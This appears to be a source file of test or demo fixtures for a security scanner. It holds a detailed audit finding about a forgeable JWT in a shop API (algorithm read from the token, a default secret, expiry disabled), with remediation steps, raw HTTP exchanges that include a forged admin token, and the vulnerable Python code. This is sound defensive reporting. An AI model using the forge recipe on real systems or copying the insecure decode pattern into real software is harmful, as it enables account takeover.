const longAuditDescription = `The JWT verification path trusts the algorithm named in the token's own header, verifies against a secret that falls back to a published default, and disables expiry checking. Any one of these is a finding on its own; together they mean a token minted by an unauthenticated attacker is accepted as an administrator.

THE THREE DEFECTS

Algorithm confusion. decode_token() reads the unverified header, then passes header["alg"] straight into the algorithms= parameter of jwt.decode(). That parameter exists specifically to pin the acceptable algorithm set server-side; sourcing it from the token inverts the control. A token presenting alg:none, or an RS256 public key replayed as an HS256 shared secret, is verified on the attacker's terms.

Default secret. config.py resolves JWT_SECRET from the environment with the literal fallback "change-me". The staging container image ships without that variable set, so staging signs and verifies with a value that is present in the public repository. Whether production sets it could not be determined from the source tree alone, and should be confirmed directly rather than assumed.

Expiry disabled. The options dict passed to jwt.decode() sets verify_exp to False. A comment in tests/test_auth.py records this as intentional, on the grounds that expiry is enforced at the gateway. That is not a property the application can rely on: the same decode path serves internal service-to-service calls that do not traverse the gateway, and the middleware does not distinguish them.

WHY THE COMBINATION MATTERS MORE THAN THE PARTS

Each defect alone requires something of the attacker. Algorithm confusion alone needs a key the server will accept. A default secret alone still leaves expiry and algorithm pinning in the way. Disabled expiry alone only extends the life of a token that was already legitimately issued.

Together they compose into an unauthenticated forge: take the published default secret, sign {"sub":"1","role":"admin"} with HS256, present it, and the server will decode it, accept the algorithm because the token named it, verify it because the secret matches, and skip expiry because the option says to. This was confirmed at runtime - a token with exp set to 1 (January 1970) was accepted and returned the administrator's full scope set.

A fourth, quieter issue compounds it: the same secret signs access tokens, refresh tokens and password-reset tokens, with no "typ" or purpose claim separating them. A password-reset token is therefore a valid access token, and the reset flow hands one to anyone who can receive mail at a registered address.

ERROR HANDLING

authenticate() calls decode_token() with no exception handling, so a malformed token raises out of the middleware and the request terminates as a 500 rather than a 401. This is not exploitable by itself, but it means invalid-token volume is invisible to any monitoring keyed on 401 rates - the signal that would otherwise surface an ongoing forging attempt lands in the 5xx bucket instead.

SCOPE OF THE REVIEW

Read: app/auth/jwt.py, app/auth/middleware.py, app/config.py, app/routes/auth.py, tests/test_auth.py. Not read: the gateway configuration, the deployment manifests that would confirm whether JWT_SECRET is set in production, and the key-rotation tooling if any exists. The runtime confirmation was performed against the staging host reachable during this scan; the production posture is inferred from shared source and should be verified before the severity here is downgraded.`

// longAuditRemediation pairs with longAuditDescription.
const longAuditRemediation = `Pin the algorithm, remove the fallback secret, re-enable expiry, and separate token purposes.

  1. Replace algorithms=[header["alg"]] with a server-side constant, algorithms=["HS256"], and delete the get_unverified_header() call. The token must never influence how it is verified.
  2. Remove the "change-me" fallback in config.py and fail startup when JWT_SECRET is unset. A service that cannot verify tokens should not accept traffic; a service that verifies them with a published secret is worse than one that is down.
  3. Delete options={"verify_exp": False} and let the library enforce exp. If internal callers genuinely need long-lived credentials, issue them long-lived tokens with a real exp rather than disabling the check for everyone.
  4. Add a "typ" claim (access, refresh, reset) and assert it at each consumption point, or sign each purpose with a separate derived key.
  5. Wrap decode_token() in the middleware so a decode failure returns 401, and alert on the 401 rate.
  6. Rotate the signing secret after the fix lands and invalidate outstanding tokens. Any token issued before rotation must be assumed forgeable.`

var longAuditRequest = rawHTTP(`POST /api/v1/auth/login HTTP/1.1
Host: api.shop.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: application/json
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Origin: https://shop.local
Referer: https://shop.local/signin?next=%2Faccount%2Forders
X-Request-Id: 1c8f0b23-6d4a-4e71-9f02-3ab5d7c9e140
Connection: keep-alive
Content-Length: 182`,
	`{"email":"carol.anderson@example.com","password":"hunter2","device":{"id":"dev_7f3c1a9042bd","platform":"web","userAgentHash":"9f2c41ab7de54c0a"},"remember":true,"captchaToken":null}`)

var longAuditResponse = rawHTTP(`HTTP/1.1 200 OK
Date: Fri, 12 Sep 2026 08:20:05 GMT
Content-Type: application/json; charset=utf-8
Set-Cookie: refresh_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwidHlwIjoicmVmcmVzaCIsImlhdCI6MTc1NzYwMDAwMH0.cmVmcmVzaC1zaWduZWQtd2l0aC10aGUtc2FtZS1zZWNyZXQ; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
Set-Cookie: sid=S1E5S2I0O1N9F4A2K3E; Path=/; HttpOnly; Secure; SameSite=Lax
Cache-Control: no-store
X-Request-Id: 1c8f0b23-6d4a-4e71-9f02-3ab5d7c9e140
Server: uvicorn`,
	`{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwicm9sZSI6ImN1c3RvbWVyIiwic2NvcGVzIjpbIm9yZGVyczpyZWFkIiwicHJvZmlsZTpyZWFkIiwicHJvZmlsZTp3cml0ZSJdLCJpYXQiOjE3NTc2MDAwMDAsImV4cCI6MTc1NzYwMzYwMH0.c2lnbmVkLXdpdGgtdGhlLWRlZmF1bHQtc2VjcmV0LWNoYW5nZS1tZQ","token_type":"bearer","expires_in":3600,"refresh_expires_in":2592000,"user":{"id":3,"email":"carol.anderson@example.com","role":"customer","mfaEnabled":false,"scopes":["orders:read","profile:read","profile:write"]},"issuer":"shop-api@staging","algorithm_hint":"HS256"}`)

var longAuditForgedRequest = rawHTTP(`GET /api/v1/users/me?include=scopes,settings,tokens HTTP/1.1
Host: api.shop.local
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwic2NvcGVzIjpbIioiXSwiaWF0IjoxLCJleHAiOjF9.Zm9yZ2VkLXdpdGgtdGhlLXB1Ymxpc2hlZC1kZWZhdWx0LXNlY3JldA
User-Agent: vigolium/0.4.6 (+https://vigolium.io)
X-Request-Id: 3e7a1c05-92bb-4d18-8f6c-0d2e4a7b9155`, "")

var longAuditForgedResponse = rawHTTP(`HTTP/1.1 200 OK
Date: Fri, 12 Sep 2026 08:20:41 GMT
Content-Type: application/json; charset=utf-8
Cache-Control: no-store
X-Request-Id: 3e7a1c05-92bb-4d18-8f6c-0d2e4a7b9155
Server: uvicorn`,
	`{"id":1,"email":"alice.anderson@example.com","role":"admin","mfaEnabled":true,"scopes":["orders:read","orders:write","users:read","users:write","payments:read","payments:refund","admin:settings","admin:audit","admin:impersonate"],"settings":{"impersonationAllowed":true,"exportLimit":null,"ipAllowlist":[]},"tokens":[{"id":"tok_1","name":"ci-deploy","prefix":"vgl_live_9f2c41ab","createdAt":"2025-03-04T10:00:00Z","lastUsedAt":"2026-09-12T07:58:00Z","scopes":["*"]},{"id":"tok_2","name":"analytics-export","prefix":"vgl_live_3b7e02cc","createdAt":"2025-11-19T14:22:00Z","lastUsedAt":"2026-09-11T23:10:00Z","scopes":["orders:read","users:read"]}],"tokenClaims":{"sub":"1","role":"admin","iat":1,"exp":1,"expiredSecondsAgo":1757600000}}`)

const longAuditSourceJWT = `# app/auth/jwt.py
import time
from typing import Any

import jwt

from app.config import SECRET_KEY, ACCESS_TTL, REFRESH_TTL


def issue_access_token(user_id: str, role: str, scopes: list[str]) -> str:
    """Mint a short-lived access token.

    NOTE: the same SECRET_KEY signs access, refresh and password-reset
    tokens, and no "typ" claim distinguishes them, so any one of the
    three is accepted wherever the others are.
    """
    now = int(time.time())
    return jwt.encode(
        {
            "sub": user_id,
            "role": role,
            "scopes": scopes,
            "iat": now,
            "exp": now + ACCESS_TTL,
        },
        SECRET_KEY,
        algorithm="HS256",
    )


def decode_token(token: str) -> dict[str, Any]:
    """Verify and decode a token.

    Three defects, all on these six lines:
      1. the algorithm is read from the token's own header
      2. SECRET_KEY may be the published default (see config.py)
      3. expiry verification is switched off
    """
    header = jwt.get_unverified_header(token)
    return jwt.decode(
        token,
        SECRET_KEY,
        algorithms=[header["alg"]],
        options={"verify_exp": False},
    )


def issue_refresh_token(user_id: str) -> str:
    now = int(time.time())
    return jwt.encode(
        {"sub": user_id, "typ": "refresh", "iat": now, "exp": now + REFRESH_TTL},
        SECRET_KEY,
        algorithm="HS256",
    )


def issue_reset_token(user_id: str) -> str:
    # signed with the same key, consumed by the same decode_token()
    now = int(time.time())
    return jwt.encode(
        {"sub": user_id, "typ": "reset", "iat": now, "exp": now + 900},
        SECRET_KEY,
        algorithm="HS256",
    )


def rotate_secret() -> None:  # pragma: no cover - never called
    raise NotImplementedError("key rotation is handled out of band")`

const longAuditSourceMiddleware = `# app/auth/middleware.py
from fastapi import Request

from app.auth.jwt import decode_token
from app.models import AnonymousUser, User


async def authenticate(request: Request):
    raw = request.headers.get("authorization", "").removeprefix("Bearer ")
    if not raw:
        return AnonymousUser()

    # No try/except: a malformed token raises out of the middleware and the
    # request terminates as a 500 rather than a 401, so invalid-token volume
    # never shows up in 401-rate monitoring.
    claims = decode_token(raw)

    return User(
        id=claims["sub"],
        role=claims.get("role", "customer"),
        scopes=claims.get("scopes", []),
    )


async def require_admin(request: Request):
    user = await authenticate(request)
    # role comes straight from the token body, which the forge controls
    if user.role != "admin":
        raise HTTPException(403, "admin required")
    return user`

const longAuditSourceConfig = `# app/config.py
import os

# Falls back to a published default when the environment is not set, which is
# the case in the container image shipped to staging. Whether production sets
# JWT_SECRET could not be determined from the source tree.
SECRET_KEY = os.getenv("JWT_SECRET", "change-me")

ACCESS_TTL = 3600
REFRESH_TTL = 2592000

DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://shop:shop@localhost:5432/shop")
STRIPE_KEY = os.getenv("STRIPE_SECRET_KEY", "")
DEBUG = os.getenv("DEBUG", "0") == "1"

# No audience or issuer is configured, so decode_token() checks neither.
JWT_AUDIENCE = None
JWT_ISSUER = None`

const longAuditSourceTest = `# tests/test_auth.py:70-90
def test_expired_token_still_accepted():
    token = make_token(sub="3", exp=0)
    # NOTE: expiry is checked at the gateway, not here
    assert decode_token(token)["sub"] == "3"


def test_alg_from_header_is_honoured():
    # documents, rather than rejects, the algorithm-confusion path
    token = jwt.encode({"sub": "3"}, SECRET_KEY, algorithm="HS512")
    assert decode_token(token)["sub"] == "3"`
